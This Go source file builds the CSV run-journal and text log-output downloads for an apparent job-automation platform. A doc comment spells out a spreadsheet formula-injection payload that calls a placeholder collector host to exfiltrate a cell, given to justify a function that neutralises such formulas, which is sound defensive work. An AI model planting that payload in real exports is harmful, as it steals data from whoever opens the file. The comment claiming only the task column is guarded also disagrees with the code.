// This file is what a job can be saved as, and the reason there are two.
//
// The two records this platform keeps of a run are complementary rather
// than alternative, and neither exists for every job. The run journal is
// durable forever and is written only by the native runbook executor, so a
// playbook job has none. The log output carries per-task detail only for a
// playbook job -- a native job publishes two events per device, "started"
// and one completion summary -- and it lives in the broker's retention
// window, so after that it is gone for everybody.
//
// A fixed pair of links would therefore hand an operator an empty file
// about half the time. Each is offered only where it has something to give,
// which is the same rule a row control follows: a choice whose only
// possible outcome is a refusal must not be drawn. The happy consequence is
// that every job ends up with exactly one useful download, and which one
// depends on what ran.
package jobs

import (
	"context"
	"encoding/csv"
	"fmt"
	"io"
	"strconv"

	"github.com/Subject-Void-LLC/the-pleiades/internal/dispatch"
	"github.com/Subject-Void-LLC/the-pleiades/internal/engine"
	"github.com/Subject-Void-LLC/the-pleiades/internal/ui/view"
)

// LogArchive is the sliver of the log stream a download needs.
//
// A port rather than a JetStream handle, because internal/ui may not import
// a concrete driver -- internal/archtest fails the build if it does -- and
// because the question this view asks is not "give me a consumer" but "is
// there anything left, and write it out".
//
// Both methods take the job rather than a subject, so the subject naming
// stays entirely inside internal/topology where it belongs.
type LogArchive interface {
	// Retained reports whether the broker still holds output for this job.
	// It is a cheap question -- a consumer's pending count -- and it is
	// what decides whether the control is drawn at all.
	Retained(ctx context.Context, jobID string) bool

	// WriteTo drains what is retained, oldest first, and stops. It is for
	// a job that has FINISHED: a running job has no end to drain to, and
	// the caller is what refuses that rather than this port guessing.
	WriteTo(ctx context.Context, w io.Writer, jobID string) error
}

// downloadJournal and downloadOutput are the URL segments, and the format
// names a saved file is addressed by.
const (
	downloadJournal = "journal"
	downloadOutput  = "output"
)

// downloads are the forms a job can be saved as, in the order the page
// offers them.
//
// The journal first, because when both are available it is the richer
// record: it is per-node, structured, and does not expire.
func downloads(entries JournalReader, logs LogArchive, jobs jobReader) []view.DownloadSpec {
	var out []view.DownloadSpec
	if entries != nil {
		out = append(out, journalDownload(entries))
	}
	if logs != nil {
		out = append(out, outputDownload(logs, jobs))
	}
	return out
}

// jobReader is the one question the output download asks of the job store:
// has this job finished.
//
// Declared here as the narrow shape rather than taking dispatch.JobStore,
// so the download's own tests can answer it without standing up a store
// that can also create and settle jobs.
type jobReader interface {
	Get(ctx context.Context, jobID string) (*dispatch.Job, []dispatch.JobTask, error)
}

// journalDownload saves the run journal as CSV.
//
// CSV rather than JSON, which is the opposite of what an API would choose
// and right for this one. The journal is a flat table of one row per node
// per device -- it has no nesting to lose -- and the person downloading it
// is doing what a table is for: sorting it, filtering it, and pasting a
// column into a ticket. A JSON array of thirty-field objects serves a
// script that could have called the API instead.
//
// It carries no secret by construction. The journal records stat and param
// KEYS and never values, holds no field whose type could contain one, and
// two archtests enforce that -- which is what makes this safe to hand
// somebody in a form they will forward.
func journalDownload(entries JournalReader) view.DownloadSpec {
	return view.DownloadSpec{
		Name:        downloadJournal,
		Label:       "Run journal (CSV)",
		Summary:     "One row per task per device. Kept for as long as the job record is, and carries no secret values.",
		ContentType: "text/csv; charset=utf-8",
		Filename:    "pleiades-journal-{id}.csv",
		Available: func(ctx context.Context, jobID string) bool {
			// A read rather than a count, because ForJob is the only
			// question this port answers and one row is enough to know.
			found, _, err := entries.ForJob(ctx, jobID, 1)
			return err == nil && len(found) > 0
		},
		Write: func(ctx context.Context, w io.Writer, jobID string) error {
			found, truncated, err := entries.ForJob(ctx, jobID, 0)
			if err != nil {
				return err
			}
			return writeJournalCSV(w, found, truncated)
		},
	}
}

// journalColumns are the CSV's header row.
//
// Wider than the Tasks table's, deliberately: a table is read down a page
// and a file is loaded into something that can hide columns, so the file
// carries what the page leaves out rather than making somebody call the
// API for the rest.
var journalColumns = []string{
	"device", "attempt", "sequence", "node", "task", "action", "action_unresolved",
	"outcome", "failure_stage", "skip_kind", "skip_ordinal", "skip_total",
	"started_at", "finished_at", "duration_ms",
	"stat_keys", "undeclared_stats", "param_keys", "undeclared_params",
	"inverse_action", "diff_recorded", "provider_program", "provider_digest",
}

// writeJournalCSV encodes entries as the file an operator opens.
//
// Times are RFC 3339 in UTC and the duration is repeated in milliseconds
// beside them. Two stamps and a derived number is redundant on purpose: the
// stamps are what an audit needs and the duration is what a person sorts
// by, and asking a spreadsheet to subtract two timestamps is asking for the
// column to be wrong.
//
// One cell is mutated on the way out, and it is stated here because a
// reader who finds a stray apostrophe in a task name deserves to know where
// it came from: see inertCell, applied to the task column alone.
func writeJournalCSV(w io.Writer, entries []engine.JournalEntry, truncated bool) error {
	out := csv.NewWriter(w)
	if err := out.Write(journalColumns); err != nil {
		return err
	}

	for _, e := range entries {
		var durationMS string
		if !e.StartedAt.IsZero() && !e.FinishedAt.IsZero() {
			if d := e.FinishedAt.Sub(e.StartedAt); d >= 0 {
				durationMS = strconv.FormatInt(d.Milliseconds(), 10)
			}
		}
		if err := out.Write([]string{
			e.DeviceID,
			strconv.Itoa(e.Attempt),
			strconv.Itoa(e.Sequence),
			e.NodeID,
			inertCell(e.TaskName),
			e.FQCN,
			strconv.FormatBool(e.FQCNUnresolved),
			string(e.Outcome),
			string(e.FailureStage),
			string(e.SkipKind),
			strconv.Itoa(e.SkipOrdinal),
			strconv.Itoa(e.SkipTotal),
			formatTime(e.StartedAt),
			formatTime(e.FinishedAt),
			durationMS,
			joinKeys(e.StatKeys),
			strconv.Itoa(e.UndeclaredStatCount),
			joinKeys(e.ParamKeys),
			strconv.Itoa(e.UndeclaredParamCount),
			e.InverseFQCN,
			strconv.FormatBool(e.DiffRecorded),
			inertCell(e.ProviderProgram),
			e.ProviderDigest,
		}); err != nil {
			return err
		}
	}

	if truncated {
		// Said in the FILE, for the reason the Tasks tab says it on the
		// page and the log download says it in its own artefact: whoever
		// is holding this is the one who needs to know it is partial, and
		// a capped audit trail that looks complete is the worst outcome
		// this download has.
		//
		// A full-width RECORD rather than a trailing line, because
		// encoding/csv pins the field count from the header and answers a
		// short row with ErrFieldCount -- so the honest disclosure would
		// otherwise make the file unreadable by every strict parser,
		// including this package's own test.
		marker := make([]string, len(journalColumns))
		marker[0] = "pleiades:truncated"
		marker[1] = fmt.Sprintf("this file stops at %d rows; the run is longer, and the rest is in the journal",
			len(entries))
		if err := out.Write(marker); err != nil {
			return err
		}
	}

	out.Flush()
	return out.Error()
}

// outputDownload saves the job's log output as text.
//
// Available only while the broker still holds it AND the job has finished,
// and the second condition is not a nicety. The stream has no end marker,
// so a drain of a running job stops at whatever had arrived when the
// request reached the broker, and a file that silently ends mid-run is
// indistinguishable from a run that ended there. The live tab is where a
// running job is watched.
func outputDownload(logs LogArchive, jobs jobReader) view.DownloadSpec {
	return view.DownloadSpec{
		Name:        downloadOutput,
		Label:       "Log output (text)",
		Summary:     "What the run printed, as the log viewer received it. Held only for the broker's retention window, so an old job has none.",
		ContentType: "text/plain; charset=utf-8",
		Filename:    "pleiades-output-{id}.log",
		Available: func(ctx context.Context, jobID string) bool {
			return finished(ctx, jobs, jobID) && logs.Retained(ctx, jobID)
		},
		Write: func(ctx context.Context, w io.Writer, jobID string) error {
			return logs.WriteTo(ctx, w, jobID)
		},
	}
}

// finished reports whether a job has reached a state nothing will move it
// out of.
//
// It reads the same terminalStates map the record page polls against, so a
// download and a page that has stopped refreshing agree about what "done"
// means. A job that cannot be read is treated as unfinished, which
// withholds the control: the failure a caller can act on is a missing link,
// not a truncated file.
func finished(ctx context.Context, jobs jobReader, jobID string) bool {
	if jobs == nil {
		return false
	}
	job, _, err := jobs.Get(ctx, jobID)
	if err != nil || job == nil {
		return false
	}
	return terminalStates[job.State]
}

// inertCell stops a task name being evaluated as a spreadsheet formula.
//
// A runbook author writes a task's name as free text -- internal/engine's
// journal calls it the residual text channel and nothing validates it --
// and a name beginning with =, +, - or @ is a FORMULA to Excel, Sheets and
// LibreOffice, not a label. So `=HYPERLINK("http://collector/?d="&A1,"ok")`
// in a task name becomes a one-click exfiltration of the row beside it, in
// a file whose own doc comment above advertises it as safe to forward. The
// author is privileged over devices; they are not privileged over the
// workstation of whoever opens the export, and on a multi-user RBAC
// platform those are routinely different people.
//
// The mutation is a leading apostrophe, chosen rather than defaulted to.
// Excel and Sheets consume it and show the original text; LibreOffice, a
// ticket paste, pandas and encoding/csv all show it literally, which is a
// visible blemish on a rare cell and is the price of the cell not running.
// A leading space would neutralise it just as well and is worse: it is
// invisible, so a reader cannot tell the export changed anything, and a
// tool that trims whitespace on import hands the formula straight back.
//
// Applied to the task column alone. Every other string cell is constructed
// or catalog-resolved -- FQCN and InverseFQCN come from collection.Lookup,
// NodeID is synthesised as "tasks[N]", DeviceID is a stored inventory id,
// and both key lists are filtered by admitKeys down to names a manifest
// declared -- so none of them can begin with a trigger character. Guarding
// them anyway would say those fields are author text, which would be the
// second false thing this file said about what it carries.
func inertCell(s string) string {
	if s == "" {
		return s
	}
	switch s[0] {
	case '=', '+', '-', '@', '\t', '\r':
		return "'" + s
	}
	return s
}

// joinKeys renders a key list for one CSV cell. Space separated rather than
// comma, so a reader scanning the raw file is not guessing which commas
// are the format's.
func joinKeys(keys []string) string {
	out := ""
	for i, k := range keys {
		if i > 0 {
			out += " "
		}
		out += k
	}
	return out
}
